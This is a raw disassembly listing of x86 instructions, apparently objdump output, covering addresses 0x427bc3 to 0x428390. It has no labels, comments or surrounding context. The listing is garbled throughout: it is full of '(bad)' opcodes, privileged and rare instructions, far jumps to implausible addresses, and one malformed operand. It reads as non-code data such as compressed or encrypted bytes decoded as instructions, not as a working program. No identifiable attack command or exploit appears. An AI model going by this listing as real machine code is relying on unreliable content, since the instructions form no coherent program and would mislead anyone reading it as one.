  427bc3:	ds jbe 0x427b47
  427bc6:	btc    DWORD PTR [edx+0x6c56e207],edx
  427bcd:	and    BYTE PTR [ebp-0x1d4af42b],0x31
  427bd4:	or     al,0x10
  427bd6:	hlt    
  427bd7:	dec    edi
  427bd8:	push   edx
  427bd9:	scas   eax,DWORD PTR es:[edi]
  427bda:	sub    BYTE PTR [ebx],0x6
  427bdd:	adc    ah,ch
  427bdf:	pushf  
  427be0:	and    eax,0xc0b7b00e
  427be5:	aad    0x2a
  427be7:	pop    ds
  427be8:	popf   
  427be9:	lods   eax,DWORD PTR ds:[esi]
  427bea:	mov    ds:0x4e782e3,al
  427bef:	pushf  
  427bf0:	dec    esi
  427bf1:	mov    esi,DWORD PTR [eax+ebp*1]
  427bf4:	or     esi,ebp
  427bf6:	and    eax,0xbc0e54d4
  427bfb:	ds lock loop 0x427bd1
  427bff:	out    0x62,eax
  427c01:	std    
  427c02:	pop    ss
  427c03:	ret    
  427c04:	push   ss
  427c05:	dec    esp
  427c06:	leave  
  427c07:	cwde   
  427c08:	repz mov edi,0xc8c797d1
  427c0e:	push   0x7b20b5c1
  427c13:	call   0xee8520e1
  427c18:	arpl   WORD PTR [esi-0x53],bp
  427c1b:	into   
  427c1c:	xchg   BYTE PTR ds:0x9d867a1c,dh
  427c22:	or     BYTE PTR [edi-0x6b],ah
  427c25:	push   cs
  427c26:	xor    eax,0x1c37da1c
  427c2b:	into   
  427c2c:	sar    DWORD PTR [edi-0x13],0xe2
  427c30:	jp     0x427c1d
  427c32:	int3   
  427c33:	fwait
  427c34:	or     al,0x8b
  427c36:	mov    ecx,0xb7afb0ee
  427c3b:	jo     0x427c70
  427c3d:	scas   eax,DWORD PTR es:[edi]
  427c3e:	imul   ecx,DWORD PTR [eax*8+0xbe096a0],0xffffffbc
  427c46:	adc    DWORD PTR [edi+ecx*8+0x5b507eef],ebx
  427c4d:	add    al,0xf
  427c4f:	imul   esp,DWORD PTR [ecx+0x6e359c51],0x17
  427c56:	int    0x9c
  427c58:	xchg   edi,eax
  427c59:	pop    ss
  427c5a:	test   BYTE PTR [ebp-0x1a],ah
  427c5d:	inc    esi
  427c5e:	xor    esp,DWORD PTR [esp+esi*2+0x58d3ceaf]
  427c65:	scas   eax,DWORD PTR es:[edi]
  427c66:	mov    ?,esi
  427c68:	mov    ebp,0x2561b724
  427c6d:	sahf   
  427c6e:	sub    DWORD PTR [ebx+0x6b],0xa882806d
  427c75:	loope  0x427cea
  427c77:	enter  0xbac7,0xf4
  427c7b:	test   DWORD PTR [ebp+0x14],esi
  427c7e:	nop
  427c7f:	jg     0x427c40
  427c81:	push   cs
  427c82:	fistp  QWORD PTR [edi]
  427c84:	cs sti 
  427c86:	jae    0x427c69
  427c88:	ds xchg edi,eax
  427c8a:	(bad)  
  427c8b:	mov    esp,ss
  427c8d:	pop    eax
  427c8e:	hlt    
  427c8f:	push   eax
  427c90:	call   0xb8cb0c3e
  427c95:	in     al,0x50
  427c97:	mov    bh,0xfa
  427c99:	mov    eax,ds:0x5f84a137
  427c9e:	add    eax,0xe210432a
  427ca3:	cmp    DWORD PTR [edx+eax*8+0x278663f6],esi
  427caa:	sbb    DWORD PTR [edx-0xd],0x28
  427cae:	or     edx,ecx
  427cb0:	ins    DWORD PTR es:[edi],dx
  427cb1:	mov    ah,cl
  427cb3:	pop    esi
  427cb4:	xchg   ecx,eax
  427cb5:	jns    0x427d17
  427cb7:	mov    bl,0xe9
  427cb9:	xchg   esi,eax
  427cba:	cmp    al,0x3b
  427cbc:	fst    QWORD PTR [esp+esi*1+0x60]
  427cc0:	mov    ecx,0x7418e69e
  427cc5:	push   edi
  427cc6:	push   ebp
  427cc7:	adc    DWORD PTR [ecx+ebx*1-0x11ee8a07],ecx
  427cce:	scas   al,BYTE PTR es:[edi]
  427ccf:	and    eax,0x6be364e8
  427cd4:	das    
  427cd5:	jb     0x427c65
  427cd7:	lods   al,BYTE PTR ds:[esi]
  427cd8:	jnp    0x427d07
  427cda:	daa    
  427cdb:	repnz dec BYTE PTR [eax-0x384bbba]
  427ce2:	test   al,0x78
  427ce4:	popf   
  427ce5:	pop    eax
  427ce6:	xchg   ebx,eax
  427ce7:	sub    ecx,eax
  427ce9:	sub    BYTE PTR [ebx+esi*8],bl
  427cec:	and    cl,BYTE PTR [edx]
  427cee:	inc    eax
	...
  427cf7:	add    BYTE PTR [eax],al
  427cf9:	add    BYTE PTR [ebx],bl
  427cfb:	daa    
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	int3   
  427d07:	fistp  WORD PTR [esi-0x50]
  427d0a:	pusha  
  427d0b:	repnz add DWORD PTR [eax],eax
  427d0e:	std    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [esp+ecx*2-0xc],bh
  427d15:	scas   eax,DWORD PTR es:[edi]
  427d16:	mov    ebp,0x1a9bb336
  427d1b:	jns    0x427d6e
  427d1d:	cmp    esi,DWORD PTR [edi-0x1e25660e]
  427d23:	mov    DWORD PTR [ebx+0x5331b4a5],ecx
  427d29:	xlat   BYTE PTR ds:[ebx]
  427d2a:	pushf  
  427d2b:	sub    eax,0x3045a9c8
  427d30:	jecxz  0x427d7b
  427d32:	inc    esi
  427d33:	ret    
  427d34:	mov    dh,0x5e
  427d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d37:	adc    BYTE PTR [edx],bl
  427d39:	cmp    DWORD PTR [ebp+0x14cff4a3],ecx
  427d3f:	sub    BYTE PTR [ebx],ah
  427d41:	sub    cl,BYTE PTR [ebp+0xeed1c1a]
  427d47:	cmp    eax,0x48e958ec
  427d4c:	ret    0xd4d3
  427d4f:	cmp    esi,DWORD PTR [edx+edi*8+0x38]
  427d53:	mov    ah,0xa3
  427d55:	(bad)  
  427d57:	inc    edx
  427d58:	into   
  427d59:	and    DWORD PTR [esi+edx*8-0x676aab14],edi
  427d60:	dec    edi
  427d61:	push   es
  427d62:	jbe    0x427d7c
  427d64:	add    edx,0xa75dd398
  427d6a:	inc    edx
  427d6b:	(bad)  
  427d6c:	xchg   edx,eax
  427d6d:	and    cl,dl
  427d6f:	jl     0x427d10
  427d71:	push   esi
  427d72:	out    0x79,eax
  427d74:	xchg   DWORD PTR [esi],ecx
  427d76:	mov    ch,0x21
  427d78:	retf   
  427d79:	out    dx,al
  427d7a:	xchg   ecx,ebx
  427d7c:	test   eax,0x1a39f4d1
  427d81:	mov    cl,BYTE PTR [ebx+0x41]
  427d84:	add    DWORD PTR [ebx+0x7c],ecx
  427d87:	mov    eax,0xe44941bb
  427d8c:	and    DWORD PTR [edi-0x42500070],esp
  427d92:	push   ebp
  427d93:	int    0x2a
  427d95:	cld    
  427d96:	dec    edi
  427d97:	pop    edi
  427d98:	mov    ds:0x2f83eb22,al
  427d9d:	stc    
  427d9e:	mov    BYTE PTR [edx+eax*8],dl
  427da1:	imul   ecx,DWORD PTR [esi+ecx*8],0x3e819bc5
  427da8:	stos   BYTE PTR es:[edi],al
  427da9:	pop    ds
  427daa:	dec    eax
  427dab:	outs   dx,BYTE PTR ds:[esi]
  427dac:	mov    ch,BYTE PTR [ebp-0x7d]
  427daf:	xlat   BYTE PTR ds:[ebx]
  427db0:	dec    esp
  427db1:	pop    edx
  427db2:	push   edi
  427db3:	mov    al,ds:0x5ac9237d
  427db8:	dec    edx
  427db9:	in     eax,0xd9
  427dbb:	mov    eax,0x93aa8f1e
  427dc0:	ss shl eax,1
  427dc3:	sbb    DWORD PTR [esi],ecx
  427dc5:	(bad)  
  427dc6:	mov    DWORD PTR [edi+0x44],esi
  427dc9:	inc    BYTE PTR [esi+0x4afba97c]
  427dcf:	dec    ebx
  427dd0:	cmp    cl,BYTE PTR [edx]
  427dd2:	mov    ebx,0xb50f40da
  427dd7:	and    al,0x22
  427dd9:	pop    esi
  427dda:	fldpi  
  427ddc:	pop    eax
  427ddd:	idiv   DWORD PTR [ecx]
  427ddf:	push   ebp
  427de0:	jbe    0x427d99
  427de2:	pop    ebx
  427de3:	mov    edx,0xe55eba8f
  427de8:	fsub   DWORD PTR ds:0x402587e3
  427dee:	ja     0x427e60
  427df0:	jnp    0x427dfb
  427df2:	imul   esp,DWORD PTR [esi],0x2b
  427df5:	bnd jne 0x427e65
  427df8:	sahf   
  427df9:	mov    ch,0x27
  427dfb:	push   esi
  427dfc:	pop    eax
  427dfd:	xchg   edx,eax
  427dfe:	xlat   BYTE PTR ds:[ebx]
  427dff:	dec    edi
  427e00:	cmp    BYTE PTR [ebp+0x12e042f3],al
  427e06:	out    dx,eax
  427e07:	test   BYTE PTR [ecx+0x6b],bh
  427e0a:	dec    edx
  427e0b:	adc    DWORD PTR [ebp-0x27],esp
  427e0e:	test   BYTE PTR [ebp+eax*8-0x16],dl
  427e12:	mov    BYTE PTR [edx+0x3],dh
  427e15:	pop    es
  427e16:	and    BYTE PTR [edi],bl
  427e18:	les    esi,FWORD PTR [esi-0x65]
  427e1b:	inc    esp
  427e1c:	sar    BYTE PTR [esi+0x17bf58e1],0xa6
  427e23:	outs   dx,DWORD PTR ds:[esi]
  427e24:	and    eax,0x205e758f
  427e29:	jno    0x427dbd
  427e2b:	arpl   WORD PTR [edi+0x2f03d4be],bx
  427e31:	sub    ebp,ecx
  427e33:	push   0xffffffd2
  427e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e36:	xor    eax,0x8c3d5924
  427e3b:	mov    al,0xb0
  427e3d:	ja     0x427e08
  427e3f:	xchg   ebp,eax
  427e40:	push   cs
  427e41:	jno    0x427dd9
  427e43:	lea    edi,ds:0x7a1696e5
  427e49:	out    dx,eax
  427e4a:	scas   al,BYTE PTR es:[edi]
  427e4b:	cli    
  427e4c:	sub    dl,BYTE PTR [ebp+ebp*1-0x37]
  427e50:	jmp    FWORD PTR [eax+0x3e]
  427e53:	cmc    
  427e54:	test   BYTE PTR [ebp-0x70164a42],al
  427e5a:	pop    eax
  427e5b:	sbb    ecx,DWORD PTR [eax]
  427e5d:	inc    edx
  427e5e:	and    eax,0x5e33d830
  427e63:	fwait
  427e64:	mov    ah,0x15
  427e66:	mov    al,0x5
  427e68:	les    ebx,FWORD PTR [ecx+0x22]
  427e6b:	push   ecx
  427e6c:	pop    esp
  427e6d:	nop
  427e6e:	sahf   
  427e6f:	rcr    BYTE PTR [ebx],0xe1
  427e72:	daa    
  427e73:	jno    0x427ee2
  427e75:	push   es
  427e76:	fistp  WORD PTR [ecx+edx*4+0xf]
  427e7a:	mov    al,0xc7
  427e7c:	pop    esp
  427e7d:	fisttp QWORD PTR [edi+0x7c]
  427e80:	ja     0x427e79
  427e82:	and    al,0x32
  427e84:	shl    BYTE PTR [esi-0x21ba9b22],0xba
  427e8b:	jecxz  0x427f05
  427e8d:	adc    eax,0xb1d4b256
  427e92:	test   DWORD PTR [edi],esi
  427e94:	mov    ebx,0x522534ab
  427e99:	xchg   dl,bh
  427e9b:	cmp    al,0xe0
  427e9d:	pop    es
  427e9e:	inc    edx
  427e9f:	push   cs
  427ea0:	jg     0x427e87
  427ea2:	or     ebx,DWORD PTR ds:0xfc427f6e
  427ea8:	loop   0x427ec0
  427eaa:	mov    esi,0xa2120789
  427eaf:	jo     0x427e6b
  427eb1:	std    
  427eb2:	adc    eax,0xdac0ce24
  427eb7:	mov    bh,0xd0
  427eb9:	and    eax,0xef87e0e1
  427ebe:	neg    BYTE PTR [eax-0x58]
  427ec1:	aaa    
  427ec2:	lds    ecx,FWORD PTR [edx-0x1e779c2d]
  427ec8:	xor    eax,0xfaf80e6d
  427ecd:	out    dx,al
  427ece:	xchg   edx,eax
  427ecf:	sub    eax,0x9a5fdd55
  427ed4:	push   ebp
  427ed5:	pop    edx
  427ed6:	adc    BYTE PTR [ebp-0x44],0x71
  427eda:	cdq    
  427edb:	cmp    al,0xa2
  427edd:	jo     0x427e90
  427edf:	xchg   DWORD PTR [edi],esi
  427ee1:	mov    dh,0x3c
  427ee3:	inc    edi
  427ee4:	adc    eax,edi
  427ee6:	inc    ebp
  427ee7:	(bad)
  427eea:	add    eax,0x269ee27c
  427eef:	mov    DWORD PTR [ebp+0x64],esp
  427ef2:	jmp    0x43190683
  427ef7:	sar    BYTE PTR [esi+0x69],1
  427efa:	retf   0xb9da
  427efd:	imul   BYTE PTR [ecx+0x2c]
  427f00:	or     eax,0xd14dcb8f
  427f05:	adc    al,0xd8
  427f07:	cmp    BYTE PTR [eax-0x65],bl
  427f0a:	add    bl,BYTE PTR [ebp+0x1]
  427f0d:	leave  
  427f0e:	adc    al,0x0
	...
  427f18:	add    BYTE PTR [eax],al
  427f1a:	call   0xdafe:0xfef82244
  427f21:	leavew 
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x42]
  427f27:	fcom   QWORD PTR [eax]
  427f29:	push   eax
  427f2a:	pop    ebp
  427f2b:	hlt    
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	std    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [esi],ah
  427f33:	and    BYTE PTR [esi],0x51
  427f36:	jp     0x427ed8
  427f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f39:	test   al,0x7f
  427f3b:	mov    bl,0x89
  427f3d:	dec    eax
  427f3e:	mov    ebp,0x79cb1d5d
  427f43:	ret    0xce7a
  427f46:	push   es
  427f47:	cmc    
  427f48:	sbb    eax,0x19113493
  427f4d:	stos   DWORD PTR es:[edi],eax
  427f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f4f:	out    dx,al
  427f50:	popa   
  427f51:	push   cs
  427f52:	xor    DWORD PTR [eax+0x33900e7],0x344e0ab4
  427f5c:	ins    DWORD PTR es:[edi],dx
  427f5d:	or     dh,dl
  427f5f:	(bad)  
  427f61:	cmp    al,0x90
  427f63:	cmp    BYTE PTR ds:0xc2494054,bh
  427f69:	jae    0x427f8d
  427f6b:	sub    al,al
  427f6d:	mov    ebp,0xb9b26bbe
  427f72:	loopne 0x427f54
  427f74:	push   ss
  427f75:	mov    ah,0xf
  427f77:	adc    al,al
  427f79:	shl    DWORD PTR [edi],0xed
  427f7c:	pop    ebx
  427f7d:	aas    
  427f7e:	jmp    0x53d8526b
  427f83:	and    al,0xf
  427f85:	pop    ecx
  427f86:	outs   dx,BYTE PTR ds:[esi]
  427f87:	cmp    edx,ebp
  427f89:	jbe    0x427f2a
  427f8b:	adc    dh,ch
  427f8d:	sti    
  427f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f8f:	aas    
  427f90:	rcl    BYTE PTR [ebp-0x3efcc024],cl
  427f96:	sbb    BYTE PTR [edx+0x5b],cl
  427f99:	enter  0x60a0,0xb3
  427f9d:	clc    
  427f9e:	sbb    DWORD PTR [ecx],0x6
  427fa1:	mul    bh
  427fa3:	jno    0x427f26
  427fa5:	shl    BYTE PTR [eax],0xcc
  427fa8:	jb     0x427f88
  427faa:	sub    al,0xa0
  427fac:	jge    0x42802d
  427fae:	or     edi,DWORD PTR [edx+0x7026381b]
  427fb4:	test   al,0xb2
  427fb6:	mov    edx,0xf3b44ca3
  427fbb:	pusha  
  427fbc:	pop    es
  427fbd:	jl     0x427f96
  427fbf:	dec    ecx
  427fc0:	int    0x5a
  427fc2:	sub    al,0x7c
  427fc4:	mov    edx,0xd4f191ba
  427fc9:	neg    DWORD PTR [edx-0x2a051404]
  427fcf:	mov    al,BYTE PTR [edx-0x3ee47898]
  427fd5:	add    bl,BYTE PTR [edi-0x49]
  427fd8:	xchg   ebp,eax
  427fd9:	arpl   WORD PTR [ecx],si
  427fdb:	shr    edx,0x7c
  427fde:	jmp    0x427f7e
  427fe0:	xchg   DWORD PTR [eax],eax
  427fe2:	xchg   DWORD PTR [edi+ecx*8],esp
  427fe5:	pop    ds
  427fe6:	jmp    0x95fb:0xb9def4c5
  427fed:	rep lods al,BYTE PTR ds:[esi]
  427fef:	jae    0x428018
  427ff1:	xor    bl,cl
  427ff3:	jge    0x428023
  427ff5:	stos   BYTE PTR es:[edi],al
  427ff6:	push   ebp
  427ff7:	push   esp
  427ff8:	sub    DWORD PTR [eax],0xfab646bb
  427ffe:	aas    
  427fff:	test   BYTE PTR [ebp+0x9],ah
  428002:	inc    esp
  428003:	loope  0x427fe4
  428005:	cs call 0xe8deac79
  42800b:	xor    al,0xbf
  42800d:	xchg   ecx,eax
  42800e:	or     ecx,ebp
  428010:	loopne 0x427fb5
  428012:	xor    eax,0x51ad39fc
  428017:	cmp    eax,edx
  428019:	fstp   TBYTE PTR [edx+0x6a]
  42801c:	imul   ebx,DWORD PTR [ecx+0x73e6ed4f],0x88f4d85
  428026:	dec    edx
  428027:	add    DWORD PTR [ecx-0x51c55530],ebp
  42802d:	in     al,dx
  42802e:	imul   ebx,DWORD PTR ds:0xbfa202e3,0xffffffb9
  428035:	cmp    al,0x9e
  428037:	mov    ds:0x721739af,al
  42803c:	mov    cl,cl
  42803e:	pushf  
  42803f:	add    eax,0xe849ce80
  428045:	and    edx,DWORD PTR [edx-0xa]
  428048:	aas    
  428049:	into   
  42804a:	or     esp,DWORD PTR [eax-0x40]
  42804d:	dec    edi
  42804e:	cmp    al,ah
  428050:	xor    al,0x4a
  428052:	xchg   edx,eax
  428053:	je     0x4280b5
  428055:	sub    eax,0x63872319
  42805a:	(bad)  
  42805b:	sbb    al,0x5b
  42805d:	sbb    BYTE PTR [ecx-0x31f276b7],ch
  428063:	enter  0xf4c5,0x88
  428067:	pop    edx
  428068:	cdq    
  428069:	ret    
  42806a:	xor    eax,DWORD PTR [ecx]
  42806c:	ret    0x4863
  42806f:	lds    edi,FWORD PTR [edx+0x7228e6c2]
  428075:	mov    ch,0x2b
  428077:	and    eax,ecx
  428079:	adc    DWORD PTR [ebp*4-0x4754a057],ebx
  428080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428081:	and    BYTE PTR [edx-0x4862d5],0x74
  428088:	or     eax,0x63c312a7
  42808d:	add    esi,esp
  42808f:	lods   ax,WORD PTR ds:[esi]
  428091:	and    edx,DWORD PTR [edi+0x7cbac565]
  428097:	rep ins DWORD PTR es:[edi],dx
  428099:	(bad)  
  42809a:	xchg   BYTE PTR [edx],cl
  42809c:	xchg   edi,eax
  42809d:	adc    esi,DWORD PTR [edx-0x5e]
  4280a0:	pop    edi
  4280a1:	jl     0x4280a8
  4280a3:	gs ins DWORD PTR es:[edi],dx
  4280a5:	sbb    ch,al
  4280a7:	(bad)  
  4280a8:	hlt    
  4280a9:	inc    ecx
  4280aa:	add    edi,edx
  4280ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280ad:	popf   
  4280ae:	(bad)  
  4280b0:	xor    BYTE PTR [esi-0x38a0569b],0x7f
  4280b7:	push   esp
  4280b8:	xchg   bl,ch
  4280ba:	retf   
  4280bb:	adc    dh,bl
  4280bd:	jno    0x4280fb
  4280bf:	gs sbb eax,0x112fea76
  4280c5:	xor    cl,cl
  4280c7:	cmc    
  4280c8:	jp     0x4280ac
  4280ca:	xchg   edi,eax
  4280cb:	push   ds
  4280cc:	int3   
  4280cd:	push   es
  4280ce:	pop    eax
  4280cf:	(bad)  
  4280d0:	push   ss
  4280d1:	xor    bh,BYTE PTR [eax-0x51]
  4280d4:	sbb    al,0xe6
  4280d6:	dec    ecx
  4280d7:	clc    
  4280d8:	adc    BYTE PTR [ecx+0x31],cl
  4280db:	pop    ss
  4280dc:	mov    edx,0x9d4c9128
  4280e1:	jle    0x428063
  4280e3:	ret    
  4280e4:	sbb    eax,0x33fca5d7
  4280e9:	mov    al,ds:0xb858a35d
  4280ee:	in     al,0x74
  4280f0:	mov    bh,0xea
  4280f2:	mov    esi,0x119f0ecb
  4280f7:	outs   dx,BYTE PTR ds:[esi]
  4280f8:	ret    
  4280f9:	leave  
  4280fa:	sbb    BYTE PTR [edx],cl
  4280fc:	mov    dl,0xd4
  4280fe:	sbb    DWORD PTR [ebp-0x11],edx
  428101:	sub    dh,BYTE PTR [eax-0x56]
  428104:	or     al,0x1f
  428106:	mov    ebp,DWORD PTR [edi-0x24]
  428109:	xchg   edi,eax
  42810a:	call   0xc70d4ae8
  42810f:	call   0xf411:0x49ca0d6
  428116:	(bad)  
  428117:	jb     0x42818b
  428119:	inc    DWORD PTR [edi+0x10]
  42811c:	out    0x91,eax
  42811e:	cdq    
  42811f:	dec    esp
  428120:	mov    al,ds:0xd6f7ba1e
  428125:	mov    bh,0xd9
  428127:	retf   
  428128:	sti    
  428129:	je     0x428179
  42812b:	mov    bl,0x98
  42812d:	pop    esi
  42812e:	push   ecx
	...
  428137:	add    BYTE PTR [eax],al
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	mov    esp,0x5a2752d3
  42814b:	test   BYTE PTR [ecx],0x0
  42814e:	std    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [ebx],bh
  428153:	sub    eax,edi
  428155:	and    ecx,esp
  428157:	inc    ecx
  428158:	out    0xee,eax
  42815a:	jmp    0x218a:0xb485469d
  428161:	inc    ecx
  428162:	int    0xb4
  428164:	jnp    0x42811c
  428166:	mov    esi,0xd42c13bc
  42816b:	lods   al,BYTE PTR ds:[esi]
  42816c:	dec    ebx
  42816d:	xchg   ebp,eax
  42816e:	cmp    BYTE PTR [edx*2-0x27922e3d],bl
  428175:	mov    bh,0xa6
  428177:	icebp  
  428178:	cmp    DWORD PTR [edi+0x70],eax
  42817b:	sar    DWORD PTR [ebx-0x54],0x93
  42817f:	mov    eax,ds:0x2f29d718
  428184:	mov    DWORD PTR [esi+eiz*1],ebx
  428187:	xor    ebp,DWORD PTR [ecx]
  428189:	into   
  42818a:	mov    fs,WORD PTR [edi+0x24]
  42818d:	mov    eax,ds:0x9d1c905c
  428192:	xor    eax,0x8f7d9d87
  428197:	ins    BYTE PTR es:[edi],dx
  428198:	retf   
  428199:	scas   al,BYTE PTR es:[edi]
  42819a:	in     eax,0x11
  42819c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42819d:	iret   
  42819e:	jae    0x42821e
  4281a0:	in     al,0xee
  4281a2:	jne    0x428200
  4281a4:	mov    cl,0x0
  4281a6:	mov    ecx,0xae3c612c
  4281ab:	(bad)  
  4281ac:	jle    0x42821e
  4281ae:	mov    bh,0xf0
  4281b0:	pop    ecx
  4281b1:	inc    ebp
  4281b2:	(bad)  
  4281b3:	call   0xfcb0e166
  4281b8:	sti    
  4281b9:	stos   BYTE PTR es:[edi],al
  4281ba:	(bad)  
  4281bb:	call   0xed1e7a0c
  4281c0:	das    
  4281c1:	ss iret 
  4281c3:	fs jmp 0x428245
  4281c6:	cmp    al,0x36
  4281c8:	repz shl edi,cl
  4281cb:	inc    ebx
  4281cc:	or     eax,0x81dce14
  4281d1:	add    al,0x79
  4281d3:	mov    ebx,0xd299588e
  4281d8:	fisubr DWORD PTR [eax+edi*1]
  4281db:	cmp    al,0x16
  4281dd:	and    edx,ebp
  4281df:	(bad)
  4281e3:	mov    edi,0x23de38bf
  4281e8:	aaa    
  4281e9:	out    dx,al
  4281ea:	jge    0x42819c
  4281ec:	pop    es
  4281ed:	inc    eax
  4281ee:	(bad)  
  4281ef:	mov    cl,0xfe
  4281f1:	arpl   WORD PTR [ebx],cx
  4281f3:	sbb    bh,cl
  4281f5:	mov    cl,0xa9
  4281f7:	dec    esp
  4281f8:	aam    0xd7
  4281fa:	ins    DWORD PTR es:[edi],dx
  4281fb:	push   DWORD PTR [edi-0x57]
  4281fe:	fwait
  4281ff:	xchg   esp,eax
  428200:	int3   
  428201:	leave  
  428202:	sub    bl,al
  428204:	test   BYTE PTR [ebp-0x637f21cb],dh
  42820a:	in     eax,0x13
  42820c:	or     ebx,ecx
  42820e:	cdq    
  42820f:	in     al,0x96
  428211:	cmp    esi,DWORD PTR [ebp-0x79ef6628]
  428217:	call   0x43fea6d2
  42821c:	ds test al,0x9c
  42821f:	sub    eax,0x4303fb57
  428224:	push   ebx
  428225:	popf   
  428226:	sub    DWORD PTR [edi],eax
  428228:	les    esi,FWORD PTR [ebx]
  42822a:	jbe    0x4282a5
  42822c:	ds jno 0x42824e
  42822f:	aaa    
  428230:	cmp    dh,dh
  428232:	popa   
  428233:	pushf  
  428234:	xchg   esp,eax
  428235:	adc    dh,BYTE PTR [edi+0x50]
  428238:	add    ch,BYTE PTR [ecx+eiz*4+0x11]
  42823c:	dec    ebp
  42823d:	pop    edi
  42823e:	in     al,dx
  42823f:	cmp    dh,BYTE PTR [edx+0x43]
  428242:	pop    ebp
  428243:	adc    bl,cl
  428245:	pop    ds
  428246:	in     eax,dx
  428247:	fld    TBYTE PTR [edi+edx*1-0x77]
  42824b:	xchg   ebx,eax
  42824c:	xchg   esp,eax
  42824d:	mov    eax,0x50a8a871
  428252:	sub    BYTE PTR [ebp-0xc],0xcf
  428256:	in     eax,0x88
  428258:	mov    bh,bh
  42825a:	retf   0xbc1
  42825d:	xchg   esp,eax
  42825e:	xchg   ebx,eax
  42825f:	scas   al,BYTE PTR es:[edi]
  428260:	daa    
  428261:	jg     0x42820d
  428263:	cmp    ebp,edx
  428265:	jg     0x4282aa
  428267:	fwait
  428268:	and    cl,BYTE PTR [ebx+esi*4]
  42826b:	test   eax,0x77134464
  428270:	push   esp
  428271:	push   ss
  428272:	repnz adc bh,BYTE PTR [esi+eiz*2]
  428276:	mov    esp,0x8318eae7
  42827b:	push   ss
  42827c:	fidivr DWORD PTR [eax-0x12]
  42827f:	and    BYTE PTR [edx],cl
  428281:	inc    eax
  428282:	inc    edi
  428283:	stos   BYTE PTR es:[edi],al
  428284:	pushf  
  428285:	jae    0x42822a
  428287:	push   ecx
  428288:	sbb    DWORD PTR [ecx+eiz*1-0x4aa92d3f],edx
  42828f:	xor    bl,cl
  428291:	sub    al,0x3a
  428293:	clc    
  428294:	test   BYTE PTR [esi],0xdd
  428297:	mov    cl,BYTE PTR [esi+0x3c]
  42829a:	outs   dx,BYTE PTR ds:[esi]
  42829b:	pushf  
  42829c:	inc    esi
  42829d:	hlt    
  42829e:	dec    esi
  42829f:	dec    esp
  4282a0:	or     eax,0x364b257
  4282a5:	mov    eax,ds:0xc6427029
  4282aa:	(bad)  
  4282ab:	out    0x3d,al
  4282ad:	xchg   edx,eax
  4282ae:	outs   dx,DWORD PTR ds:[esi]
  4282af:	mov    ebx,DWORD PTR [edx+0x27]
  4282b2:	sbb    al,0xfa
  4282b4:	cmp    dh,dl
  4282b6:	mov    dl,0xcf
  4282b8:	(bad)  
  4282b9:	mov    eax,0xd3160292
  4282be:	dec    ebp
  4282bf:	xor    DWORD PTR [ebx+0x6d],eax
  4282c2:	imul   esp,DWORD PTR [ebx-0x69ad7780],0x1d
  4282c9:	jb     0x4282a7
  4282cb:	push   es
  4282cc:	(bad)
  4282cf:	lea    ebp,[edi]
  4282d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282d2:	pop    esp
  4282d3:	ss cmc 
  4282d5:	mov    esi,0x2002e4f
  4282da:	js     0xca6e6498
  4282e0:	gs in  eax,0x7e
  4282e3:	sub    eax,DWORD PTR [ebx+0x3]
  4282e6:	or     al,ch
  4282e8:	sbb    dl,dl
  4282ea:	lahf   
  4282eb:	mov    DWORD PTR [ebx+0x79],ecx
  4282ee:	jp     0x428345
  4282f0:	ds jo  0x428356
  4282f3:	and    eax,0x78024b97
  4282f8:	in     al,0x44
  4282fa:	push   edi
  4282fb:	pop    es
  4282fc:	cmp    DWORD PTR ss:[ebx+0x56],esi
  428300:	into   
  428301:	inc    esi
  428302:	or     al,0xa8
  428304:	jmp    0x7b7b:0xf285cfcf
  42830b:	xlat   BYTE PTR ds:[ebx]
  42830c:	and    BYTE PTR [edi+0x21],0xce
  428310:	adc    al,0xf2
  428312:	xor    al,0x78
  428314:	icebp  
  428315:	mov    ebx,0xe350b95a
  42831a:	lea    eax,[esi+0x23]
  42831d:	mov    ecx,0xf8c67aa7
  428322:	xor    eax,0x1c58d42c
  428327:	scas   al,BYTE PTR es:[edi]
  428328:	cwde   
  428329:	lock inc edx
  42832b:	das    
  42832c:	push   ds
  42832d:	jne    0x428352
  42832f:	test   DWORD PTR [edi],eax
  428331:	repnz fisub WORD PTR [ecx+0x45]
  428335:	add    al,0x28
  428337:	xchg   eax,edx
  428339:	pop    eax
  42833a:	scas   al,BYTE PTR es:[edi]
  42833b:	enter  0x6e55,0x3c
  42833f:	pop    edx
  428340:	jb     0x428380
  428342:	fidiv  DWORD PTR ss:[edx]
  428345:	rcr    DWORD PTR [eax+0x5e4ccea3],cl
  42834b:	push   es
  42834c:	mov    ds:0x50ba,eax
	...
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x42833e
  428367:	push   ss
  428368:	into   
  428369:	test   DWORD PTR [edi-0x8],edx
  42836c:	add    DWORD PTR [eax],eax
  42836e:	jmp    0xb143:0x23000001
  428375:	ins    DWORD PTR es:[edi],dx
  428376:	(bad)  
  428377:	jmp    0xfe0c0de5
  42837c:	mov    cl,0xd8
  42837e:	fisub  DWORD PTR [eax+0x55]
  428381:	adc    dl,bl
  428383:	rcr    BYTE PTR [eax+0x7d],1
  428386:	xchg   esp,eax
  428387:	xchg   ebp,eax
  428388:	sbb    DWORD PTR [ebx],edx
  42838a:	pop    eax
  42838b:	mov    esi,0x2e00cbb5
  428390:	(bad)  
